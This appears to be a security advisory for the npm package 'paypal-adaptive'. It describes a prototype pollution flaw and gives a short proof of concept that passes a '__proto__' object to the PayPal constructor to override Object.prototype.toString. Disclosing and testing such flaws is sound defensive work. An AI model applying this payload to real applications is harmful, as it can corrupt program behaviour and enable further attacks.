# Overview

`paypal-adaptive` is a sdk for Paypal Adaptive Payments and Paypal Adaptive Accounts APIs, this package is vulnerable to Prototype Pollution.

The PayPal function could be tricked into adding or modifying properties of `Object.prototype` using a `proto` payload.

# Proof of Concept

```
var PayPal = require('paypal-adaptive');
var p = new PayPal({"__proto__": {"toString": "huntr.dev"}, "userId": "foo", "password": "bar", "signature": "abcd", "appId": "1234", "sandbox": "1234"});
console.log(({}).toString);
```
